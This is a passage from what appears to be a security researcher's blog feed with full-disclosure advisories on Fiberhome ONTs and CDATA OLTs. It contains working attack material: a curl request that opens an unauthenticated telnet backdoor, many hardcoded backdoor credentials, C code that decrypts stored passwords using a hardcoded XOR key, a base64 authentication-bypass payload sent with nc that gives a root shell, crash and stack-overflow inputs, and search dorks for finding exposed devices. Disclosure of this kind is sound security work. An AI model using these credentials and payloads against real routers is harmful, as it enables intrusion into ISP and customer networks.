Wan IP: [REMOVED]
WAN Mac: [REMOVED] &lt;-------- Used for the telnet backdoor
[...]
</code></pre>
<p>Also, it is very easy to guess the MAC address of the <code>br0</code> interface based on the WAN MAC address (e.g.: <code>wan0</code>: <code>xx:xx:xx:xx:xx:x3</code>, <code>br0</code> will be <code>xx:xx:xx:xx:xx:x0</code>).</p>
<p><a id="httpd-backdoor-telnet"></a></p>
<h2>Details - HTTP Server - Backdoor allowing telnet access</h2>
<p>In order to reach the telnetd CLI server, it is also possible to reach a backdoor API without authentication provided by the HTTP server. This will remove firewall rules and allow an attacker to reach the telnet server (used for CLI).</p>
<p>This backdoor can be found inside the <code>webs</code> binary:</p>
<p>From <code>sub_C46F8()</code> (called from main()):</p>
<p><img alt="" src="images/2021-fiberhome-sub_C46F8.png" />
<center>Pseudo-code of <code>sub_C46F8()</code></center></p>
<p>The <code>backdoor_telnet()</code> function (named during reverse engineering, the original name is unknown):</p>
<p><img alt="" src="images/2021-fiberhome-backdoor_telnet.png" />
<center>Pseudo-code of <code>backdoor_telnet()</code></center></p>
<p>We can reverse the function <code>omci_set_telnet_uni_state()</code> from <code>libgl3_advance.so</code>:</p>
<p><img alt="" src="images/2021-fiberhome_omci_set_telnet_uni_state.png" />
<center>Pseudo-code of <code>omci_set_telnet_uni_state()</code></center></p>
<p>On line 24, rules will be added depending of the value of the argument of this function.</p>
<p>Finally, the <code>getOnuMac()</code> function will provide a custom valid entry from the MAC address of the <code>br0</code> interface:</p>
<p><img alt="" src="images/2021-fiberhome-getOnuMac.png" />
<center>Pseudo-code of <code>getOnuMac()</code></center></p>
<p>The backdoor is reachable by sending a HTTPS request: </p>
<ul>
<li><code>https://[ip]/telnet?enable=0&amp;key=calculated(BR0_MAC)</code></li>
</ul>
<p>The 'secret' algorithm will extract the ending part of the mac address.</p>
<p>For the MAC: AA:AA:AA:01:02:03, an attacker can enable the backdoor by sending:</p>
<pre><code>$ curl -k 'https://[ip]/telnet?enable=1&amp;key=010203'
</code></pre>
<p>Opening the access to the telnetd:</p>
<pre><code>$ curl -k 'https://192.168.1.1/telnet?enable=1&amp;key=[REMOVED]'
Open telnet success!
$ telnet 192.168.1.1
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.

------acl IP:192.168.1.2 --------
Login: 
telnet&gt; q
Connection closed.
</code></pre>
<p>Closing the access to the telnetd:</p>
<pre><code>$ curl -k 'https://192.168.1.1/telnet?enable=0&amp;key=[REMOVED]'
$ telnet 192.168.1.1 23
Trying 192.168.1.1...
telnet: connect to address 192.168.1.1: Connection refused
telnet: Unable to connect to remote host
</code></pre>
<p>The IPv4 firewall rules before and after triggering the backdoor:</p>
<p>Access is being blocked:</p>
<pre><code>#iptables-save |grep telnet
:input_ext_access_telnet_ani - [0:0]
:input_ext_access_telnet_uni - [0:0]
-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j input_ext_access_telnet_uni
-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j input_ext_access_telnet_ani
-A input_ext_access_telnet_ani -i tel0 -p tcp -m tcp --dport 23 -j ACCEPT
-A input_ext_access_telnet_ani -i br0 -p tcp -m tcp --dport 23 -j ACCEPT
-A input_ext_access_telnet_ani -p tcp -m tcp --dport 23 -j REJECT --reject-with tcp-reset
-A input_ext_access_telnet_uni -i br0 -p tcp -m tcp --dport 23 -j REJECT --reject-with tcp-reset
</code></pre>
<p>Access is allowed:</p>
<pre><code>#iptables-save |grep telnet
:input_ext_access_telnet_ani - [0:0]
:input_ext_access_telnet_uni - [0:0]
-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j input_ext_access_telnet_uni
-A input_ext_access_ctrl -p tcp -m tcp --dport 23 -j input_ext_access_telnet_ani
-A input_ext_access_telnet_ani -i tel0 -p tcp -m tcp --dport 23 -j ACCEPT
-A input_ext_access_telnet_ani -i br0 -p tcp -m tcp --dport 23 -j ACCEPT
-A input_ext_access_telnet_ani -p tcp -m tcp --dport 23 -j REJECT --reject-with tcp-reset
</code></pre>
<p><a id="httpd-hardcoded-credentials"></a></p>
<h2>Details - HTTP Server - Hardcoded credentials</h2>
<p>The web daemon contains a list of hardcoded credentials, for different ISPs:</p>
<ul>
<li>user / user1234</li>
<li>f~i!b@e#r$h%o^m*esuperadmin / s(f)u_h+g|u</li>
<li>admin / lnadmin</li>
<li>admin / CUadmin</li>
<li>admin / admin</li>
<li>telecomadmin / nE7jA%5m</li>
<li>adminpldt / z6dUABtl270qRxt7a2uGTiw</li>
<li>gestiontelebucaramanga / t3l3buc4r4m4ng42013</li>
<li>rootmet / m3tr0r00t</li>
<li>awnfibre / fibre@dm!n</li>
<li>trueadmin / admintrue</li>
<li>admin / G0R2U1P2ag</li>
<li>admin / 3UJUh2VemEfUtesEchEC2d2e</li>
<li>admin / getOnuMac(s, 6, 32); &lt;- last part of the MAC address of the <code>br0</code> interface</li>
<li>admin / 888888</li>
<li>L1vt1m4eng / 888888</li>
<li>useradmin / 888888</li>
<li>user / 888888</li>
<li>admin / 1234</li>
<li>user / tattoo@home</li>
<li>admin / tele1234</li>
<li>admin / aisadmin</li>
</ul>
<p>You can find the incomplete list below:</p>
<p><img alt="" src="images/2021-fiberhome-webs-hardcoded-passwords-00.png" /></p>
<p><img alt="" src="images/2021-fiberhome-webs-hardcoded-passwords-01.png" /></p>
<p>I really like <code>m3tr0r00t</code> :)</p>
<p>There are passwords everywhere in the <code>webs</code> binary (HTTP Server).</p>
<p>These credentials, used with <code>https://ip/fh</code> will allow to open the access to the CLI telnet on port 23/tcp.</p>
<p><a id="httpd-tr09-hardcoded-credentials"></a></p>
<h2>Details - HTTP Server - TR-069 hardcoded credentials</h2>
<p>We can find hardcoded credentials inside the <code>webs</code> binary for TR-069:</p>
<p><code>telecomadmin</code></p>
<p><img alt="" src="images/2021-fiberhome-webs-itms-hardcoded-login.png" />
<center>Pseudo-code from <code>webs</code></center></p>
<p><a id="httpd-decryption-algorithm"></a></p>
<h2>Details - HTTP Server - Credentials decryption algorithm</h2>
<p>By default, some credentials appear to be encrypted (in <code>/fhconf/umconfig.txt</code> file).</p>
<p>It is possible to decrypt them using the encryption function found inside the webs binary. This algorithm uses mainly xor with the hardcoded key <code>*j7a(L#yZ98sSd5HfSgGjMj8;Ss;d)(*&amp;^#@$a2s0i3g</code> so we can encrypt passwords and decrypt "encrypted" passwords:</p>
<p><img alt="" src="images/2021-fiberhome-webs-decrypt-passwords.png" />
<center>Pseudo-code from <code>decrypt_password()</code></center></p>
<p>A re-implementation in C can be shown below:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdio.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;string.h&gt;</span><span style="color: #BC7A00"></span>

<span style="color: #B00040">int</span>       <span style="color: #0000FF">main</span>(<span style="color: #B00040">int</span>    argc,
               <span style="color: #B00040">char</span>   <span style="color: #666666">**</span>argv,
               <span style="color: #B00040">char</span>   <span style="color: #666666">**</span>envp)
{
  <span style="color: #B00040">char</span> key[<span style="color: #666666">45</span>] <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;*j7a(L#yZ98sSd5HfSgGjMj8;Ss;d)(*&amp;^#@$a2s0i3g&quot;</span>;

  <span style="color: #B00040">char</span> password[<span style="color: #666666">12</span>] <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\x59\x42\x51\x48\x5d\x13\x4b\x52\x3d\x45\x4d\x00</span><span style="color: #BA2121">&quot;</span>;
  <span style="color: #408080; font-style: italic">//char password[12] = &quot;s(f)u_h+g|u\x00&quot;;</span>

  <span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span> encrypted_char;

  <span style="color: #008000; font-weight: bold">for</span> (<span style="color: #B00040">int</span> i <span style="color: #666666">=</span> <span style="color: #666666">0</span>; i <span style="color: #666666">&lt;</span> strlen(password); i<span style="color: #666666">++</span>)
  {
    encrypted_char <span style="color: #666666">=</span> password[i] <span style="color: #666666">^</span> key[i <span style="color: #666666">%</span> <span style="color: #008000; font-weight: bold">sizeof</span>(key)];

    <span style="color: #008000; font-weight: bold">if</span> (encrypted_char <span style="color: #666666">&amp;&amp;</span> <span style="color: #666666">!</span>(encrypted_char <span style="color: #666666">&amp;</span> <span style="color: #666666">0x2000</span>))
      printf(<span style="color: #BA2121">&quot;%c&quot;</span>, encrypted_char);
  }

  printf(<span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);

  <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">0</span>);
}
</pre></div>

<p>And it works:</p>
<pre><code>$ cc decrypt-passwords-umconfig.c -o decrypt-passwords-umconfig &amp;&amp; ./decrypt-passwords-umconfig | hexdump -C
00000000  73 28 66 29 75 5f 68 2b  67 7c 75 0a              |s(f)u_h+g|u.|
0000000c
</code></pre>
<p>Interesting fact: we previously found this hardcoded key in FTTH OLTs from another FTTH vendor:</p>
<p><a href="https://pierrekim.github.io/blog/2020-07-07-cdata-olt-0day-vulnerabilities.html#weak-encryption-algorithm">https://pierrekim.github.io/blog/2020-07-07-cdata-olt-0day-vulnerabilities.html#weak-encryption-algorithm</a></p>
<p>It appears this key and this algorithm come from GoAhead:</p>
<p><a href="https://github.com/BruceYang-yeu/goahead-1/blob/master/um.c#L51">https://github.com/BruceYang-yeu/goahead-1/blob/master/um.c#L51</a></p>
<p><a id="telnet-linux-hardcoded-credentials"></a></p>
<h2>Details - Telnet server (Linux) - Hardcoded credentials</h2>
<p>A hardcoded password for root is being defined inside <code>/etc/init.d/system-config.sh</code>:</p>
<pre><code>#cat /etc/init.d/system-config.sh
#!/bin/sh

case "$1" in
        start)
                echo "Configuring system..."
                # these are some miscellaneous stuff without a good home
                mount -o remount,sync /fhconf
                mkdir -p /dev/shm/fhdrv_kdrv_ver_tmp /dev/shm/usr_tmp /fhconf/data
                echo "root:W/xa5OyC3jjQU:0:0:root:/:bin/sh" &gt; /etc/passwd
                echo "nobody:x:99:99:Nobody:/:/bin/false" &gt;&gt; /etc/passwd
                ifconfig lo 127.0.0.1 netmask 255.0.0.0 broadcast 127.255.255.255 up
                echo &gt; /var/udhcpd/udhcpd.leases
                exit 0
                ;;

# cat /etc/passwd
root:W/xa5OyC3jjQU:0:0:root:/:bin/sh
nobody:x:99:99:Nobody:/:/bin/false
</code></pre>
<p><code>W/xa5OyC3jjQU</code> is the DES encrypted data for <code>GEPON</code>.</p>
<p>This telnet server doesn't run by default but it is possible to start it from the telnet CLI.</p>
<p><a id="telnet-cli-hardcoded-credentials"></a></p>
<h2>Details - Telnet server (CLI) - Hardcoded credentials</h2>
<p>telnet on port 23/tcp can be also abused with these credentials:</p>
<ul>
<li><code>gpon</code>/<code>gpon</code></li>
<li>enable: <code>gpon</code></li>
</ul>
<p>Demo:</p>
<pre><code>$ nc -v 192.168.1.1 23
Connection to 192.168.1.1 23 port [tcp/telnet] succeeded!

------acl IP:192.168.1.2 --------
Login: gpon
gpon
Password: gpon
User&gt; enable
enable
Password: gpon
****
Config#
</code></pre>
<p>We can retrieve these backdoors by reversing the <code>libci_adaptation_layer.so</code> library:</p>
<p><img alt="" src="images/2021-fiberhome-addDefualLoginAndUser.png" />
<center>Pseudo-code of <code>addDefualLoginAndUser()</code> from <code>libci_adaptation_layer.so</code></center></p>
<p>For specific ISPs, there are these valid credentials:</p>
<ul>
<li><code>admin</code> / 4 hexadecimal chars, generated in the <code>init_3bb_password()</code> function located in <code>libci_adaptation_layer.so</code></li>
<li><code>rdsadmin</code> / <code>6GFJdY4aAuUKJjdtSn7d</code></li>
</ul>
<p>You can also test <code>gepon</code>/<code>gepon</code> (from the firmware extracted in the other analyzed fiberhome device (AN5506-04-FA, firmware RP2631, 4 April 2019)).</p>
<p><a id="telnet-cli-privilege-escalation"></a></p>
<h2>Details - Telnet server (CLI) - Privilege escalation</h2>
<p>The CLI telnet server runs on port 23/tcp and can be reached by (i) adding firewall rules from the HTTP server either using the backdoor API, (ii) using backdoor credentials on the web interface or (iii) exploiting a stack overflow in previous HTTP daemons.
It is also reachable by default over IPv6 on <code>br0</code> and <code>wan0</code> interface.</p>
<p>It is possible to start a Linux telnetd as root on port 26/tcp using the CLI interface, as shown below:</p>
<pre><code>User&gt; ddd
WRI(DEBUG_H)&gt; shell
Please use port 26 to telnet 
WRI(DEBUG_H)&gt; tshell
Please use port 26 to telnet
</code></pre>
<p><code>shell</code> and <code>tshell</code> will call the function <code>enter_telnet_shell()</code> from <code>libcli_cli.so</code>, running <code>system("telnet -p 26")</code>.
This telneld will then use hardcoded credentials.</p>
<p><img alt="" src="images/2021-fiberhome-enter_telnet_shell.png" />
<center>Pseudo-code of <code>enter_telnet_shell()</code></center></p>
<p>Surprisingly, there is another function called <code>enter_tshell</code> (for a legacy <code>tshell</code>) which will run a <code>system("sh")</code> as root.</p>
<p>This function <code>enter_tshell()</code> providing a rootshell is not being called from <code>shell</code> so this looks like dead code:</p>
<p><img alt="" src="images/2021-fiberhome-enter_tshell.png" />
<center>Pseudo-code of <code>enter_tshell()</code></center></p>
<p><a id="telnet-cli-auth-bypass"></a></p>
<h2>Details - Telnet server (CLI) - Authentication bypass</h2>
<p>It is possible to bypass telnet authentication by sending a specific string to the remote telnet server:</p>
<pre><code>$ echo 'GgpoZWxwCmxpc3QKd2hvCg==' | base64 -d &gt; bypass-auth-telnet
$ hexdump -C bypass-auth-telnet
00000000  1a 0a 68 65 6c 70 0a 6c  69 73 74 0a 77 68 6f 0a  |..help.list.who.|
00000010
$ nc 192.168.1.1 23 &lt; bypass-auth-telnet

------acl IP:192.168.1.2 --------
Login: 
User&gt; 
User&gt; help

      This system provides help feature as described below.

      1. Anytime you need help, just press "?" and don't
  press Enter,you can see each possible command argument
  and its description.

      2. You can also input "list" and then press Enter
  to execute this helpful command to view the list of
  commands you can use.

User&gt; list
 0. clear
 1. enable
 2. exit
 3. help
 4. list
 5. ping {[-t]}*1 {[-count] &lt;1-65535&gt;}*1 {[-size] &lt;1-6400&gt;}*1 {[-waittime] &lt;1-255&gt;}*1 {[-ttl] &lt;1-255&gt;}*1 {[-pattern] &lt;user_pattern&gt;}*1 {[-i] &lt;A.B.C.C&gt;}*1 &lt;A.B.C.D&gt; 
 6. quit
 7. show history
 8. show idle-timeout
 9. show ip
10. show services
11. show syscontact
12. show syslocation
13. terminal length &lt;0-512&gt;
14. who
15. who am i
User&gt; who
SessionID. - UserName ---------- LOCATION ---------- MODE ---- 
7            not login           192.168.1.2         not login (That's me.)
Total 1 sessions in current system. 
User&gt;
</code></pre>
<p><a id="telnet-cli-auth-bypass-linux-telnetd"></a></p>
<h2>Details - Telnet server (CLI) - Authentication bypass to start the Linux telnetd</h2>
<p>It is possible to use the previous authentication bypass to start a full telnetd server on port 26 and then get a root shell using the password from <a href="#telnet-linux-hardcoded-credentials">Telnet server (Linux) - Hardcoded credentials</a>.</p>
<p>By sending <code>ddd</code> then <code>tshell</code>, a telnetd will be started on port 26/tcp:</p>
<pre><code>$ echo GgpoZWxwCmxpc3QKd2hvCmRkZAp0c2hlbGwK | base64 -d | nc target 23 &amp;
------acl IP:192.168.1.2 --------
Login: 
User&gt; 
User&gt; help

      This system provides help feature as described below.

      1. Anytime you need help, just press "?" and don't
  press Enter,you can see each possible command argument
  and its description.

      2. You can also input "list" and then press Enter
  to execute this helpful command to view the list of
  commands you can use.

User&gt; list
 0. clear
 1. enable
 2. exit
 3. help



$ telnet target 26
Trying target...
Connected to target.
Escape character is '^]'.

(none) login: root
Password: [GEPON]


BusyBox v1.27.2 (2019-04-01 19:16:06 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

#id
uid=0(root) gid=0 groups=0
</code></pre>
<p>The attacker will get a root shell.</p>
<p><a id="telnet-cli-dos"></a></p>
<h2>Details - Telnet server (CLI) - DoS</h2>
<p>It is possible to crash the telnet daemon by sending a specific string:</p>
<pre><code>$ hexdump -C crash-auth-telnet 
00000000  1a 0a 65 6e 61 62 6c 65  0a 02 0a 1a 0a           |..enable.....|
0000000d
$ nc -v 192.168.1.1 23 &lt; crash-auth-telnet 
192.168.1.1: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.1.1] 23 (telnet) open
$ nc -v 192.168.1.1 23 &lt; crash-auth-telnet 
192.168.1.1: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.1.1] 23 (telnet) : Connection refused
</code></pre>
<p>This segfault exists inside <code>/fh/extend/load_cli</code> but was not studied as the previous bypass already worked.</p>
<p><a id="system-credentials-clear-text-files"></a></p>
<h2>Details - System - Credentials stored in clear-text</h2>
<p>Some credentials are stored in clear-text with permissive rights:</p>
<pre><code>#pwd
/fhconf/fh_wifi
#ls -la 
drwxr-xr-x    2 root     0              536 Jan  7  2020 .
drwxr-xr-x   14 root     0            10264 Jan  8 15:29 ..
-rw-r--r--    1 root     0              118 Jan  1  1970 wifi_custom.cfg
-rw-r--r--    1 root     0             1212 Jan  7  2020 wifictl_2g.cfg
-rw-r--r--    1 root     0             1178 Jan  7  2020 wifictl_2g.cfg.bak
-rw-r--r--    1 root     0             1213 Jan  7  2020 wifictl_5g.cfg
-rw-r--r--    1 root     0             1208 Jan  7  2020 wifictl_5g.cfg.bak

#cat /fhconf/fh_wifi/wifi_custom.cfg 
ssid_2g=[REMOVED]
ssid_5g=[REMOVED]
country=BR
auth=WPAPSKWPA2PSK
encrypt=tkipaes
psk=[REMOVED]
#

#cat wifictl_2g.cfg
[...]
WPAPSK=[REMOVED]
[...]
WEPKey1=[REMOVED]
[...]
WEPKey2=[REMOVED]
[...]
WEPKey3=[REMOVED]
[...]
WEPKey4=[REMOVED]
[...]
RadiusKey=[REMOVED]

#cat wifictl_5g.cfg
SSID=[REMOVED]
[...]
WPAPSK=[REMOVED]
[...]
WEPKey1=[REMOVED]
[...]
WEPKey2=[REMOVED]
[...]
WEPKey3=[REMOVED]
[...]
WEPKey4=[REMOVED]
[...]
RadiusKey=[REMOVED]
</code></pre>
<p><a id="system-credentials-clear-text-nvram"></a></p>
<h2>Details - Misc - Passwords stored in clear-text in nvram</h2>
<p>Some passwords are stored in clear-text in nvram:</p>
<pre><code>#nvram show
wl0.1_key=1
wl0.1_key1=[REMOVED]
wl0.1_key2=[REMOVED]
wl0.1_key3=[REMOVED]
wl0.1_key4=[REMOVED]
[...]
wl0.1_ssid=[REMOVED]
[...]
wl0.1_wpa_psk=[REMOVED]
[...]
wl0_key1=[REMOVED]
wl0_key2=[REMOVED]
wl0_key3=[REMOVED]
wl0_key4=[REMOVED]
[...]
wl0_ssid=[REMOVED]
[...]
wl0_wpa_psk=[REMOVED]
[...]
[ passwords everywhere removed because of space ]
[...]
</code></pre>
<p><a id="misc-remote-stack-overflow-an5506"></a></p>
<h2>Details - Misc - Remote stack overflow in the HTTP server (AN5506-04-FA / RP2631)</h2>
<p>I got another Fiberhome device with a different firmware version (AN5506-04-FA, firmware RP2631, 4 April 2019). The HG6245D and the AN5506-04-FA devices share a very similar code base.</p>
<p>The firmware on the AN5506-04-FA device is vulnerable to a remote stack overflow in the <code>webs</code> process by sending a Cookie value with a length &gt; 511 bytes to any valid asp webpage. This can be triggered using a simple wget command:</p>
<pre><code>$ wget --no-check-certificate -O- --header 'Cookie: loginName=AAAA[511bytes]AAAA' https://192.168.1.1/tr069/tr069.asp
</code></pre>
<p>In the HG6245D firmware version RP2602, this vulnerability has been patched by checking the size of values in the cookies, so I was not able to exploit it. You can also read the log file to confirm the length is now checked:</p>
<pre><code>&lt;web_ga&gt;2020-01-08 21:23:12,../thd_ga2_5/webs.c[1375](websParseRequest): Request header param value is too long! key: cookie
</code></pre>
<p>It appears it has been patched in the HG6245D router, firmware RP2602. Firmware RP2631 (4 April 2019) for router AN5506-04-FA remains vulnerable.
I found no CVE or public research about this vulnerability so it may have been silently patched by the vendor for the HG6245D router.</p>
<h2>Dorks</h2>
<p><code>acl IP:</code></p>
<p><code>GoAhead-Webs/2.5.0 PeerSec-MatrixSSL/3.4.2-OPEN</code></p>
<h2>Vendor Response</h2>
<p>Full-disclosure is applied as it is believed that some backdoors have been intentionally placed by the vendor.</p>
<h2>Report Timeline</h2>
<ul>
<li>Jan 7, 2020: Majority of vulnerabilities found.</li>
<li>Jan 8, 2020: This advisory was written.</li>
<li>Aug 2020: Found the lack of IPv6 firewall.</li>
<li>Jan 9, 2021: Vulnerabilities checked again and the advisory was rewritten.</li>
<li>Jan 12, 2021: A public advisory is sent to security mailing lists.</li>
<li>Feb 7, 2021: The latest firmware version (RP2613) is confirmed to be vulnerable.</li>
<li>Feb 10, 2021: MITRE providesli>
</ul>
<h2>Credits</h2>
<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="//pierrekim.github.io/advisories/2021-fiberhome-0x00-ont.txt">https://pierrekim.github.io/advisories/2021-fiberhome-0x00-ont.txt</a></p>
<p><a href="https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html">https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>Multiple vulnerabilities found in CDATA OLTs</title>
        <link href="2020-07-07-cdata-olt-0day-vulnerabilities.html"/>
        <content type="html"><h2>Product Description</h2>
<p>The CDATA OLTs are OEM FTTH OLTs, sold under different brands (Cdata, OptiLink, BLIY), allowing to provide FTTH connectivity to a large number of clients (using ONTs).
Some of the devices support multiple 10-gigabit uplinks and provide Internet connectivity to up to 1024 ONTs (clients).</p>
<p>We validated the vulnerabilities against FD1104B and FD1108SN OLTs in our lab environment with the latest firmware versions (V1.2.2 and 2.4.05_000, 2.4.04_001 and 2.4.03_000).
<img alt="" src="images/2020-olt.jpg" /></p>
<p>Using static analysis, these vulnerabilities also appear to affect all available OLT models as the codebase is similar:</p>
<ul>
<li>72408A</li>
<li>9008A</li>
<li>9016A</li>
<li>92408A</li>
<li>92416A</li>
<li>9288</li>
<li>97016</li>
<li>97024P</li>
<li>97028P</li>
<li>97042P</li>
<li>97084P</li>
<li>97168P</li>
<li>FD1002S</li>
<li>FD1104</li>
<li>FD1104B</li>
<li>FD1104S</li>
<li>FD1104SN</li>
<li>FD1108S</li>
<li>FD1204S-R2</li>
<li>FD1204SN</li>
<li>FD1204SN-R2</li>
<li>FD1208S-R2</li>
<li>FD1216S-R1</li>
<li>FD1608GS</li>
<li>FD1608SN</li>
<li>FD1616GS</li>
<li>FD1616SN</li>
<li>FD8000</li>
</ul>
<p>From the analyzed binaries, we extracted information about the OEM vendor:</p>
<pre><code>CDATA
Flat 6, Bldg 4,South 2 of Honghualing Industrial Zone, Liuxian Road, Xili Town, Shenzhen, Guangdong, China(518055)
marketing@cdatatec.com
</code></pre>
<p>For explanation about FTTH architecture, you can check my previous research at <a href="http://pierrekim.github.io/blog/2016-11-01-gpon-ftth-networks-insecurity.html">http://pierrekim.github.io/blog/2016-11-01-gpon-ftth-networks-insecurity.html</a>.</p>
<h2>Vulnerabilities Summary</h2>
<p>The summary of the vulnerabilities is:</p>
<ol>
<li><a href="#backdoor-telnet">Backdoor Access with telnet - CVE-2020-29059, CVE-2020-29060, CVE-2020-29061, CVE-2020-29062</a></li>
<li><a href="#credentials-infoleak-telnet">Credentials infoleak and credentials in clear-text (telnet) - CVE-2020-29054</a></li>
<li><a href="#command-injection-root">Escape shell with root privileges - CVE-2020-29056</a></li>
<li><a href="#pre-auth-remote-dos">Pre-Auth Remote DoS - CVE-2020-29057</a></li>
<li><a href="#credentials-infoleak-web">Credentials infoleak and credentials in clear-text (HTTP) - CVE-2020-29058</a></li>
<li><a href="#weak-encryption-algorithm">Weak encryption algorithm - CVE-2020-29063</a></li>
<li><a href="#insecure-management-interfaces">Insecure management interfaces - CVE-2020-29055</a></li>
</ol>
<p><a id="backdoor-telnet"></a></p>
<h2>Details - Backdoor Access with telnet</h2>
<p>A telnet server is running in the appliance and is reachable from the WAN interface and from the FTTH LAN interface (from the ONTs).</p>
<p>Depending on the firmware, the backdoor credentials may change. You can find below a complete list of backdoor (undocumented) credentials, giving an attacker a complete administrator CLI access.</p>
<p>Previous and old versions can be abused with:</p>
<pre><code>login: suma123
password: panger123
</code></pre>
<p>New recent versions can be abused with:</p>
<pre><code>login: debug
password: debug124

login: root
password: root126

login: guest
password: [empty]
</code></pre>
<p><img alt="" src="images/2020-olt-sub_7740A4.png" />
<center>Authentication process with hardcoded credentials</center></p>
<p>The credentials have been extracted from old and new firmware images.</p>
<p>About the credentials, it depends on the vendors and the version of the firmware - the appearance of the CLI may be different but the access still works.</p>
<p>Using <code>suma123</code>/<code>panger123</code>:</p>
<pre><code>$ telnet [ip]
********************************************************************
        Command Line Interface for EPON System
                 Hardware Ver:  V1.2
                 Software Ver:  V1.2.2
                 Created Time:  Mar 12 2018 06:54:24
    Copyright (c) 2015-2020 All rights reserved.
********************************************************************
Username:panger123
Password:suma123

Entry Supperuer successfully!

epon@
 alarm                     - setting system alarm
 best-sys                  - configure sys information
 epon-workmode             - configure EPON working-mode
 ethernet-ring             - configure rapid ring
 igmp-snooping             - configure IGMP Snooping
 interface                 - interface type
 ipconfig                  - configure the system IP address
 logout                    - exit the CLI system
 mac-address-table         - ctrl-card dynamic mac address table management
 mirror                    - configure switch mirror
 onu-auth                  - configure authentication mode for Olt
 ping                      - net ping
 port-isolate-group        - create port-isolate-group, you must enable port-isolate-mode for group
 rmon                      - configure RMON
 rstp                      - rapid spanning tree protocol configuration
 show                      - show system configuration
 system                    - configure systerm
 trunk                     - enter trunk config mode
 undo                      - delete relational configuration
 vlan                      - enter vlan config mode
epon@
</code></pre>
<p>Using <code>guest</code>/<code>[empty]</code>:</p>
<pre><code>$ telnet [ip]
********************************************************************
        Command Line Interface for EPON System
                 Hardware Ver:  V3.2
                 Software Ver:  2.4.04_001
                 Created Time:  Nov 27 2017 10:38:49
    Copyright (c) 2006-2015 All rights reserved.
********************************************************************
Username:guest
Password:[empty]
epon#
--------------------------------------------------
  Local Configuration Command
--------------------------------------------------

--------------------------------------------------
  Global Command
--------------------------------------------------
 broadcast            - Write message to all users logged in
 clear                - Clear the screen
 history              - Show command history
 logout               - Log off this system
 ping                 - Ping a network hosts
 show                 - show system configuration
 tracert              - trace the route to host
 tree                 - Show command tree

epon# show
--------------------------------------------------
  Local Configuration Command
--------------------------------------------------
 acl                  - Show ACL(s)
 auth                 - show olt auth mode
 dhcp-snooping        - show dhcp snooping configurations
 exec-timeout         - show cli console timeout
 igmp                 - show igmp snooping configurations
 mac-address          - mac-address
 mac-address-table    - show current port's mac address
 mirror               - show switch mirror configurations
 olt                  - show olt's configuration
 onu-position         - show the position of onu by mac
 qinq                 - show QinQ configuration
 rmon                 - show RMON
 rstp                 - Display RSTP information
 running-config       - show current running-configuration
 startup-config       - show current startup-configuration
 swmode               - show swmode
 swport               - display port attribute information
 system               - show system configuration
 trunk                - show trunk configuration
 vlan                 - show vlan configuration
 web                  - web server!
epon#
</code></pre>
<p>Using <code>root</code>/<code>root126</code>:</p>
<pre><code>$ telnet [ip]
********************************************************************
        Command Line Interface for EPON System
                 Hardware Ver:  V3.2
                 Software Ver:  2.4.04_001
                 Created Time:  Nov 27 2017 10:38:49
    Copyright (c) 2006-2015 All rights reserved.
********************************************************************
Username:root
Password:root126
epon#
--------------------------------------------------
  Local Configuration Command
--------------------------------------------------
 acl                  - Create ACL(s)
 acl-del              - Delete ACL(s)
 auth                 - configure authentication mode for Olt
 btv                  - btv
 cdt-sys              - configure sys information
 dhcp-snooping        - configure DHCP Snooping
 exec-timeout         - set a timeout value
 igmp                 - configure IGMP Snooping
 mac-address          - ctrl-card dynamic mac address table management
 mirror               - configure switch mirror
 multicast-vlan       - multicast-vlan &lt;mvlan&gt;
 no                   - no
 olt                  - configure OLT
 reset                - reset the values
 rmon                 - configure RMON
 rstp                 - rapid spanning tree protocol configuration
 swmode               - set basic switch mode
 swport               - enter switch port config mode
 system               - configure systerm
 trunk                - enter trunk config mode
 vlan                 - enter vlan config mode

--------------------------------------------------
  Global Command
--------------------------------------------------
 broadcast            - Write message to all users logged in
 clear                - Clear the screen
 debug                - debug
 history              - Show command history
 logout               - Log off this system
 ping                 - Ping a network hosts
 show                 - show system configuration
 tracert              - trace the route to host
 tree                 - Show command tree
 who                  - Display users currently logged in
epon#
</code></pre>
<p>Using <code>debug</code>/<code>debug124</code>:</p>
<pre><code>$ telnet [ip]
********************************************************************
        Command Line Interface for EPON System
                 Hardware Ver:  V3.2
                 Software Ver:  2.4.04_001
                 Created Time:  Nov 27 2017 10:38:49
    Copyright (c) 2006-2015 All rights reserved.
********************************************************************
Username:debug
Password:debug124
epon#
--------------------------------------------------
  Local Configuration Command
--------------------------------------------------
 acl                  - Create ACL(s)
 acl-del              - Delete ACL(s)
 auth                 - configure authentication mode for Olt
 btv                  - btv
 dhcp-snooping        - configure DHCP Snooping
 exec-timeout         - set a timeout value
 igmp                 - configure IGMP Snooping
 mac-address          - ctrl-card dynamic mac address table management
 mirror               - configure switch mirror
 multicast-vlan       - multicast-vlan &lt;mvlan&gt;
 no                   - no
 olt                  - configure OLT
 reset                - reset the values
 rmon                 - configure RMON
 rstp                 - rapid spanning tree protocol configuration
 swmode               - set basic switch mode
